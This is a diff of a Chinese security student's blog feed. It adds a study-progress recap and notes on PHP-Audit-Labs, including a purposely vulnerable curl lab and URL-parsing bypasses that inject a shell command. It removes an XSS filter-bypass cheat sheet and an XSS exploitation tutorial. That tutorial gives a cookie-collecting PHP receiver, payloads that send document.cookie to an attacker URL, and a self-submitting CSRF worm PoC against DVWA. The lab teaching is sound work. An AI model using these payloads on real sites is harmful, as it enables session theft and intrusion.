@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://lnng.top/"/>
-  <updated>2021-08-24T13:10:09.702Z</updated>
+  <updated>2021-10-01T12:25:02.432Z</updated>
   <id>https://lnng.top/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>摸鱼web安全两年总结</title>
+    <link href="https://lnng.top/posts/fdb2.html"/>
+    <id>https://lnng.top/posts/fdb2.html</id>
+    <published>2021-10-01T12:17:00.000Z</published>
+    <updated>2021-10-01T12:25:02.432Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="开学了"><a href="#开学了" class="headerlink" title="开学了"></a>开学了</h3><p>大三开学了，What’s up，转眼都大三了，学网络安全两年(摸了两年🐟)，回顾一下</p><blockquote><p>发现自己越来越菜…</p></blockquote><h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><p>看看去年立的flag<a href="https://lnng.top/posts/ba80.html">学习安全一年总结</a></p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>打打vulnhub</td><td>✓  打了DC1-9</td></tr><tr><td>继续学习常见漏洞</td><td>✓ 看了中间件 thinkphp一点</td></tr><tr><td>学习代码审计</td><td>× 就看过两三个cms，废了废了</td></tr><tr><td>学习内网相关知识</td><td>✓ att&amp;ck打了几个，看了一些认证协议，写了个免杀小工具</td></tr><tr><td>学习脚本语言Python</td><td>× Python直接没咋看，就平常看些师傅的工具 ，改看go了</td></tr><tr><td>sqlmap等工具，也尝试自己写点小工具(尽力吧!?)</td><td>× sqlmap看了几个命令，没整tamper(等于没学)    小工具没咋写(马上写！！！)</td></tr></tbody></table><hr><p>总结:</p><p>flag白立了<img src="/images/pasted-633.png" alt="upload successful"></p><h3 id="继续立flag！！！一定完成"><a href="#继续立flag！！！一定完成" class="headerlink" title="继续立flag！！！一定完成"></a>继续立flag！！！一定完成</h3><ul><li>阅读师傅们优秀的开源代码，写个稍微大点的工具项目</li><li>学习java框架，看看java审计， 熟悉php代码审计，了解使用CodeQL 代码审计工具原理</li><li>了解小程序 app 硬件设备渗透思路 了解二进制逆向反编译</li><li>继续熟悉内网渗透 了解windows api pe等结构结构</li><li>了解钓鱼攻击，近源攻击 社会工程学 等攻击手法</li><li>了解下机器学习，看看能不能运用到web安全</li><li>挖到几个”有意思”的洞或大厂的洞</li></ul><p>要学的还有蛮多的比如js逆向啥的感觉也得看看，web安全的学习之路是无止境的啊！要保持终身学习!</p><p><img src="/images/pasted-634.png" alt="upload successful"></p><h3 id="最重要"><a href="#最重要" class="headerlink" title="最重要"></a>最重要</h3><p>找到喜欢的web安全方向       学有所广  学有所深</p><p>还有考研和工作方面的选择。。。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;开学了&quot;&gt;&lt;a href=&quot;#开学了&quot; class=&quot;headerlink&quot; title=&quot;开学了&quot;&gt;&lt;/a&gt;开学了&lt;/h3&gt;&lt;p&gt;大三开学了，What’s up，转眼都大三了，学网络安全两年(摸了两年🐟)，回顾一下&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;发现
+      
+    
+    </summary>
+    
+    
+      <category term="个人日常" scheme="https://lnng.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%B8%B8/"/>
+    
+    
+      <category term="日记" scheme="https://lnng.top/tags/%E6%97%A5%E8%AE%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>常见中间件漏洞</title>
@@ -138,6 +166,32 @@
       <category term="内网渗透" scheme="https://lnng.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
     
       <category term="att&amp;ck红队评估实战靶场" scheme="https://lnng.top/tags/att-ck%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PHP-Audit-Labs笔记</title>
+    <link href="https://lnng.top/posts/bccf.html"/>
+    <id>https://lnng.top/posts/bccf.html</id>
+    <published>2021-05-12T11:40:00.000Z</published>
+    <updated>2021-10-01T12:16:46.589Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="PHP-A-udit-Labs"><a href="#PHP-A-udit-Labs" class="headerlink" title="PHP-A udit-Labs"></a>PHP-A udit-Labs</h3><p>地址:<br><a href="https://github.com/hongriSec/PHP-Audit-Labs" target="_blank" rel="noopener">https://github.com/hongriSec/PHP-Audit-Labs</a></p><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><p><img src="/images/pasted-427.png" alt="upload successful"><br>个人测试php</p><pre><code>&lt;?php$rate = $_POST[&#39;rate&#39;];$conf[&#39;Whitelist&#39;] = array(1,2,3,4,5);if(in_array($rate, $conf[&#39;Whitelist&#39;])){    echo &quot;在白名中&quot;;}else{    echo &quot;不在白名单中&quot;;}?&gt;</code></pre><p><img src="/images/pasted-428.png" alt="upload successful"><br>PHP在使用 in_array() 函数判断时，会将1 union select user(); 强制转换成数字1;容易发生在文件上传 sql中</p><p>修复:将 in_array() 函数的第三个参数设置为 true ，或者使用 intval() 函数将变量强转成数字，又或者使用正则匹配来处理变量。</p><h3 id="filter-var函数缺陷"><a href="#filter-var函数缺陷" class="headerlink" title="filter_var函数缺陷"></a>filter_var函数缺陷</h3><pre><code>// index.php&lt;?php $url = $_GET[&#39;url&#39;];if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL)){    $site_info = parse_url($url);    if(preg_match(&#39;/sec-redclub.com$/&#39;,$site_info[&#39;host&#39;])){        exec(&#39;curl &quot;&#39;.$site_info[&#39;host&#39;].&#39;&quot;&#39;, $result);        echo &quot;&lt;center&gt;&lt;h1&gt;You have curl {$site_info[&#39;host&#39;]} successfully!&lt;/h1&gt;&lt;/center&gt;              &lt;center&gt;&lt;textarea rows=&#39;20&#39; cols=&#39;90&#39;&gt;&quot;;        echo implode(&#39; &#39;, $result);    }    else{        die(&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;);    }}else{    echo &quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;;}?&gt;</code></pre><p>大佬绕过 filter_var</p><p><a href="https://mochazz.github.io/2018/08/18/PHP-Audit-Labs%E9%A2%98%E8%A7%A3%E4%B9%8BDay1-4/#Day2%E9%A2%98%E8%A7%A3%EF%BC%9A-By-%E4%B8%83%E6%9C%88%E7%81%AB" target="_blank" rel="noopener">https://mochazz.github.io/2018/08/18/PHP-Audit-Labs%E9%A2%98%E8%A7%A3%E4%B9%8BDay1-4/#Day2%E9%A2%98%E8%A7%A3%EF%BC%9A-By-%E4%B8%83%E6%9C%88%E7%81%AB</a></p><pre><code>http://localhost/index.php?url=http://demo.com@sec-redclub.comhttp://localhost/index.php?url=http://demo.com&amp;sec-redclub.comhttp://localhost/index.php?url=http://demo.com?sec-redclub.comhttp://localhost/index.php?url=http://demo.com/sec-redclub.comhttp://localhost/index.php?url=demo://demo.com,sec-redclub.comhttp://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/http://localhost/index.php?url=http://demo.com#sec-redclub.com</code></pre><p><img src="/images/pasted-429.png" alt="upload successful"><br>然后就是命令执行</p><pre><code>http://localhost/index.php?url=demo://%22;ls;%23;sec-redclub.com:80/</code></pre><p><img src="/images/pasted-430.png" alt="upload successful"><br>关于curl parse_url()绕过，这大佬文章讲的手法也很nice<br><a href="https://www.anquanke.com/post/id/101058#h2-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/101058#h2-4</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;PHP-A-udit-Labs&quot;&gt;&lt;a href=&quot;#PHP-A-udit-Labs&quot; class=&quot;headerlink&quot; title=&quot;PHP-A udit-Labs&quot;&gt;&lt;/a&gt;PHP-A udit-Labs&lt;/h3&gt;&lt;p&gt;地址:&lt;br&gt;&lt;a href=&quot;ht
+      
+    
+    </summary>
+    
+    
+      <category term="代码审计" scheme="https://lnng.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    
+      <category term="PHP-Audit-Labs" scheme="https://lnng.top/tags/PHP-Audit-Labs/"/>
     
   </entry>
   
@@ -512,58 +566,6 @@
     
     
       <category term="wifi渗透" scheme="https://lnng.top/tags/wifi%E6%B8%97%E9%80%8F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>xss原理绕过防御个人总结</title>
-    <link href="https://lnng.top/posts/a100.html"/>
-    <id>https://lnng.top/posts/a100.html</id>
-    <published>2020-07-25T08:53:37.000Z</published>
-    <updated>2020-07-25T09:07:24.908Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="xss原理"><a href="#xss原理" class="headerlink" title="xss原理"></a>xss原理</h2><p>xss产生的原因是将恶意的html脚本代码插入web页面，底层原理和sql注入一样，都是因为js和php等都是解释性语言，会将输入的当做命令执行,所以可以注入恶意代码执行我们想要的内容</p><h2 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类"></a>xss分类</h2><ul><li>存储型xss:<br>js脚本代码会插入数据库，具有一定的持久性</li><li>反射型xss:<br>js经过后端php等语言处理</li><li>dom型xss:<br>和反射型xss类似，但是不经过后端服务器的处理<h2 id="xss绕过总结"><a href="#xss绕过总结" class="headerlink" title="xss绕过总结:"></a>xss绕过总结:</h2><h3 id="自身绕过"><a href="#自身绕过" class="headerlink" title="自身绕过"></a>自身绕过</h3><pre><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;  //没有过滤&lt;Script&gt;alert(&#39;xss&#39;)&lt;/Script&gt; //大小写绕过&lt;scscriptript&gt;alert(&#39;xss&#39;)&lt;/scscriptript&gt; //嵌套绕过&lt;sc\x00ript&gt;alert(&#39;xss&#39;)&lt;/sc\x00ript&gt; //空字节绕过&quot; oonnclick=alert(&#39;XSS&#39;) //           //闭合单双引号绕过(对于html实体输入的和过滤&lt; &gt;)</code></pre></li></ul><h3 id="其他标签绕过"><a href="#其他标签绕过" class="headerlink" title="其他标签绕过"></a>其他标签绕过</h3><pre><code>&lt;a herf=&quot;javascript:alert(1)&quot;&gt;show&lt;/a&gt; &lt;body onload=alert(1)&gt;&lt;input type=image src=x:x onerror=alert(1)&gt;&lt;isindex onmouseover=&quot;alert(1)&quot; &gt;&lt;form oninput=alert(1)&gt;&lt;input&gt;&lt;/form&gt;&lt;textarea autofocus onfocus=alert(1)&gt;&lt;input oncut=alert(1)&gt;&lt;svg onload=alert(1)&gt;&lt;keygen autofocus onfocus=alert(1)&gt;&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;&lt;marquee onstart=alert(1)&gt;</code></pre><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h4><pre><code>&lt;a herf=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;show&lt;/a&gt;&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#39;))&quot;&gt;               </code></pre><h4 id="Unicode编码绕过"><a href="#Unicode编码绕过" class="headerlink" title="Unicode编码绕过"></a>Unicode编码绕过</h4><p>在线编码地址:<a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/tools/unicode.aspx</a></p><pre><code>&lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;&lt;script&gt;\u0061lert(1)&lt;/script&gt;&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</code></pre><p><img src="https://Lmg66.github.io/img/146.png" alt="图片"></p><h4 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h4><pre><code>&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#39;))&quot;&gt;</code></pre><h4 id="Ascii码绕过"><a href="#Ascii码绕过" class="headerlink" title="Ascii码绕过"></a>Ascii码绕过</h4><pre><code>&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&lt;/script&gt;</code></pre><p>可使用浏览器插件快速编码<br><img src="https://Lmg66.github.io/img/147.png" alt="图片"></p><h4 id="hex绕过"><a href="#hex绕过" class="headerlink" title="hex绕过"></a>hex绕过</h4><pre><code>&lt;img src=x onerror=eval(&#39;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#39;)&gt;</code></pre><h4 id="十进制，八进制，十六进制"><a href="#十进制，八进制，十六进制" class="headerlink" title="十进制，八进制，十六进制"></a>十进制，八进制，十六进制</h4><pre><code>&lt;img src=x onerror=&quot;\u0061lert(1)&quot;/&gt;&lt;img src=x onerror=&quot;eval(&#39;\141lert(1)&#39;)&quot;/&gt;&lt;img src=x onerror=&quot;eval(&#39;\x61lert(1)&#39;)&quot;/&gt;&lt;img src=x onerror=”&amp;#x0061;lert(1)”/&gt;&lt;img src=x onerror=”&amp;#97;lert(1)”/&gt;&lt;img src=x onerror=”eval(‘\a\l\ert(1)‘)”/&gt;</code></pre><h3 id="补充-on事件"><a href="#补充-on事件" class="headerlink" title="补充:on事件"></a>补充:on事件</h3><pre><code>onsearchonwebkitanimationendonwebkitanimationiterationonwebkitanimationstartonwebkittransitionendonabortonbluroncanceloncanplayoncanplaythroughonchangeonclickoncloseoncontextmenuoncuechangeondblclickondragondragendondragenterondragleaveondragoverondragstartondropondurationchangeonemptiedonendedonerroronfocusonformdataoninputoninvalidonkeydownonkeypressonkeyuponloadonloadeddataonloadedmetadataonloadstartonmousedownonmouseenteronmouseleaveonmousemoveonmouseoutonmouseoveronmouseuponmousewheelonpauseonplayonplayingonprogressonratechangeonresetonresizeonscrollonseekedonseekingonselectonstalledonsubmitonsuspendontimeupdateontoggleonvolumechangeonwaitingonwheelonauxclickongotpointercaptureonlostpointercaptureonpointerdownonpointermoveonpointeruponpointercancelonpointeroveronpointeroutonpointerenteronpointerleaveonselectstartonselectionchangeonanimationendonanimationiterationonanimationstartontransitionendonafterprintonbeforeprintonbeforeunloadonhashchangeonlanguagechangeonmessageonmessageerroronofflineononlineonpagehideonpageshowonpopstateonrejectionhandledonstorageonunhandledrejectiononunload</code></pre><h3 id="长度限制的绕过"><a href="#长度限制的绕过" class="headerlink" title="长度限制的绕过:"></a>长度限制的绕过:</h3><h4 id="可以利用事件如"><a href="#可以利用事件如" class="headerlink" title="可以利用事件如:"></a>可以利用事件如:</h4><pre><code>&quot;onclick=alert(1)// 来减少字数</code></pre><h4 id="将代码藏入location-hash中，构造为"><a href="#将代码藏入location-hash中，构造为" class="headerlink" title="将代码藏入location.hash中，构造为"></a>将代码藏入location.hash中，构造为</h4><pre><code>&quot;onclick=&quot;eval(location.hash.sustr(1))</code></pre><h4 id="注释将两个文本框变为一个"><a href="#注释将两个文本框变为一个" class="headerlink" title="注释将两个文本框变为一个"></a>注释将两个文本框变为一个</h4><h4 id="奇怪的符号解析"><a href="#奇怪的符号解析" class="headerlink" title="奇怪的符号解析"></a>奇怪的符号解析</h4><pre><code>&lt;svg/onload=alert()&gt;&lt;script/src=//⑭.₨&gt;</code></pre><p>参考文章:<a href="https://nosec.org/home/detail/3206.html" target="_blank" rel="noopener">https://nosec.org/home/detail/3206.html</a></p><h2 id="xss防御"><a href="#xss防御" class="headerlink" title="xss防御"></a>xss防御</h2><ol><li>设置cookie中设置httponly属性，那么js脚本将无法读取到cookie信息<br>PHP5(PHP5.2以上版本已支持HttpOnly参数的设置，同样也支持全局的HttpOnly的设置，在php.ini中设置，设置其值为1或者TRUE，来开启全局的Cookie的HttpOnly属性)<br>session.cookie_httponly =<br>当然代码也能实现：<br>ini_set(“session.cookie_httponly”, 1);<br>session_set_cookie_params(0, NULL, NULL, NULL, TRUE);</li><li>限制输入长度，在业务内减少用户能输入长度，像年龄，用户名等地方限制15个字符，几乎就很难xss（个人理解）</li><li>过滤业务用不到的字符如&lt; &gt;，script等标签字符</li><li>输出检查，输出到url的进行URLEncode，输出进行html实体化输出</li><li>成熟框架相对安全些（注意是相对）<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2>深入理解浏览器解析机制和XSS向量编码：<a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a><br>XSS过滤绕过速查表：<a href="https://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/153055.html</a><br>《白帽子讲web安全》</li></ol>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;xss原理&quot;&gt;&lt;a href=&quot;#xss原理&quot; class=&quot;headerlink&quot; title=&quot;xss原理&quot;&gt;&lt;/a&gt;xss原理&lt;/h2&gt;&lt;p&gt;xss产生的原因是将恶意的html脚本代码插入web页面，底层原理和sql注入一样，都是因为js和php等都是解释性
-      
-    
-    </summary>
-    
-    
-      <category term="web安全" scheme="https://lnng.top/categories/web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="xss" scheme="https://lnng.top/tags/xss/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>xss利用</title>
-    <link href="https://lnng.top/posts/b0f.html"/>
-    <id>https://lnng.top/posts/b0f.html</id>
-    <published>2020-07-18T12:09:53.000Z</published>
-    <updated>2020-07-18T12:13:49.050Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="xss盗取cookie"><a href="#xss盗取cookie" class="headerlink" title="xss盗取cookie"></a>xss盗取cookie</h2><h3 id="什么是cookie"><a href="#什么是cookie" class="headerlink" title="什么是cookie"></a>什么是cookie</h3><p>cookie是曲奇饼，啊开个玩笑，cookie是每个用户登录唯一id和账号密码一样可以登录到网站，是的你没有听错cookie可以直接登录，至于服务器怎么设置cookie<br>和cookie存储这里就不说了，需的要自行百度</p><h3 id="xss盗取cookie-dvwa演示"><a href="#xss盗取cookie-dvwa演示" class="headerlink" title="xss盗取cookie(dvwa演示)"></a>xss盗取cookie(dvwa演示)</h3><p>学习xss时觉得啊这，不就是一个弹窗吗，有啥用，经过学习后发现xss的危害还是挺大的，弹窗的目的只是说明这里可以执行动态脚本，那就可以干很多事情了</p><h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p>官网:<a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a><br>下载地址:<a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a><br>下载方式:zip下载或git <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a><br>下载完成放入http服务下即可<br>我使用的是phpstudy下载地址:<a href="https://m.xp.cn/" target="_blank" rel="noopener">https://m.xp.cn/</a></p><h4 id="设置接受盗取cookie方式"><a href="#设置接受盗取cookie方式" class="headerlink" title="设置接受盗取cookie方式"></a>设置接受盗取cookie方式</h4><p>xss盗取的cookie肯定是要保存到我们自己的服务器上，可以设置一个接受cookie的php网页代码接受到请求携带cookie后保存到文件或者数据库中等都可以，当然也可以不设置存储，随便请求一个一个服务器网页存在不存在无所谓，因为请求可以保存到日志文件，但是看起来可能不方便而已，下面是保存cookie的php代码</p><pre><code>&lt;?phpif(isset($_GET[&#39;cookie&#39;]))                 //如果接收到cookie{    $file = fopen(&#39;./cookie.txt&#39;, &#39;a&#39;);    //打开存储的文件    fwrite($file, $_GET[&#39;cookie&#39;].&quot;\r\n&quot;); //将获取的cookie存储    fclose($file);                         //关闭文件}</code></pre><h4 id="放置xss-这里用存储型xss测试"><a href="#放置xss-这里用存储型xss测试" class="headerlink" title="放置xss(这里用存储型xss测试)"></a>放置xss(这里用存储型xss测试)</h4><pre><code>&lt;script&gt;document.location=&#39;http://127.0.0.1/cookies/cookies.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></pre><p>我这里用的本地的测试，document.cookie，就是获取cookie，然后携带cookie访问<a href="http://127.0.0.1/cookies/cookies.php?（换成自己服务器ip就可以了，这里我本地测试），先查看一下我们的cookie" target="_blank" rel="noopener">http://127.0.0.1/cookies/cookies.php?（换成自己服务器ip就可以了，这里我本地测试），先查看一下我们的cookie</a><br><img src="https://Lmg66.github.io/img/139.png" alt="图片"></p><p>然后点击我们放存储型xss的地方（xss(stored)）,发现跳转到了令一个网站，并且携带了你的cookie</p><p><img src="https://Lmg66.github.io/img/140.png" alt="图片"></p><p>在到cookie.php目录查看cookie.txt，可以发现cookie已经被存储，cookie被盗取，我们可以利用cookie进行登录<br><img src="https://Lmg66.github.io/img/141.png" alt="图片"><br>这种动静可能有点大，可以用js加载图片的方式来发送带有cookie的请求，</p><pre><code>&lt;script&gt;new Image().src = &#39;http://127.0.0.1/cookies/cookies.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></pre><p><a href="https://www.cnblogs.com/yangzhou33/p/9215937.html" target="_blank" rel="noopener">使用new Image()进行预加载</a><br><img src="https://Lmg66.github.io/img/142.png" alt="图片"><br>当然如果你还有其动静小的方法可以留言，当然还可以用来加载其他的xss神器js代码</p><pre><code>&lt;script src=&#39;&#39;&gt;</code></pre><h2 id="xss蠕虫"><a href="#xss蠕虫" class="headerlink" title="xss蠕虫"></a>xss蠕虫</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>有存储型xss，可以csrf</p><h3 id="原理（个人理解，如有错误可以评论联系我）"><a href="#原理（个人理解，如有错误可以评论联系我）" class="headerlink" title="原理（个人理解，如有错误可以评论联系我）"></a>原理（个人理解，如有错误可以评论联系我）</h3><p><img src="https://Lmg66.github.io/img/143.png" alt="图片"></p><h3 id="相关代码（只是简单的，有过滤，要考虑绕过）"><a href="#相关代码（只是简单的，有过滤，要考虑绕过）" class="headerlink" title="相关代码（只是简单的，有过滤，要考虑绕过）"></a>相关代码（只是简单的，有过滤，要考虑绕过）</h3><p>主体存储xss</p><pre><code>&lt;script&gt;document.location=&#39;csrf地址&#39;;&lt;/script&gt;</code></pre><p>csrf生成<br>用burpsuite抓包，右键，如图选择，copy复制，然后放到自己服务器等等，当然也可以自己编写csrf的poc，使之功能更加强大，可以自己点击等等，还有一些绕过等等，这只是简单的csrf的poc<br><img src="https://Lmg66.github.io/img/144.png" alt="图片"><br><img src="https://Lmg66.github.io/img/145.png" alt="图片"><br>csrf演示代码，抓取的dvwa包加了js自动点击</p><pre><code>&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;    &lt;form action=&quot;http://127.0.0.1/lmg/vulnerabilities/xss_s/index.php&quot; method=&quot;POST&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;txtName&quot; value=&quot;æµ&amp;#139;è&amp;#175;&amp;#149;&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;mtxMessage&quot; value=&quot;æµ&amp;#139;è&amp;#175;&amp;#149;&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;btnSign&quot; value=&quot;Sign&amp;#32;Guestbook&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;  &lt;script type=&quot;text/javascript&quot;&gt;                          // js自动点击      var form = document.getElementsByTagName(&#39;form&#39;)[0];      var input = document.getElementsByTagName(&#39;input&#39;)[3];      input.value = window.location.hash.substr(1);      form.submit();  &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>受害者储存xss和主体xss类似只是跳转的网页不同</p><pre><code>&lt;script&gt;document.location=&#39;csrf地址&#39;;&lt;/script&gt;</code></pre><h3 id="个人思考"><a href="#个人思考" class="headerlink" title="个人思考"></a>个人思考</h3><p>xss的蠕虫利用起来还是比较难的，要有存储型xss（还要各种绕过），和csrf，但是危害是很大的，不仅仅是传播文章，可以利用这个传播盗取更多人cookie，个人信息，位置，浏览器版本安装软件等等</p><h2 id="xss利用的思考（持续思考）"><a href="#xss利用的思考（持续思考）" class="headerlink" title="xss利用的思考（持续思考）"></a>xss利用的思考（持续思考）</h2><p>像反射型xss，dom型的xss不在局限于点一个很长的链接，可以利用其他第三方网站来跳转，也可以利用短链接，也可以利用二维码，二维码捆绑一个链接，所以扫描未知二维码是非常危险的事情<br>像存储型xss，可以利用储存型xss对其他网站进行流量攻击</p><h2 id="参考文章与说明"><a href="#参考文章与说明" class="headerlink" title="参考文章与说明"></a>参考文章与说明</h2><p><a href="https://www.freebuf.com/vuls/191274.html" target="_blank" rel="noopener">技术讨论 | 记一次XSS蠕虫渗透实验</a><br>说明：本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;xss盗取cookie&quot;&gt;&lt;a href=&quot;#xss盗取cookie&quot; class=&quot;headerlink&quot; title=&quot;xss盗取cookie&quot;&gt;&lt;/a&gt;xss盗取cookie&lt;/h2&gt;&lt;h3 id=&quot;什么是cookie&quot;&gt;&lt;a href=&quot;#什么是cooki
-      
-    
-    </summary>
-    
-    
-      <category term="web安全" scheme="https://lnng.top/categories/web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="xss" scheme="https://lnng.top/tags/xss/"/>
     
   </entry>
   
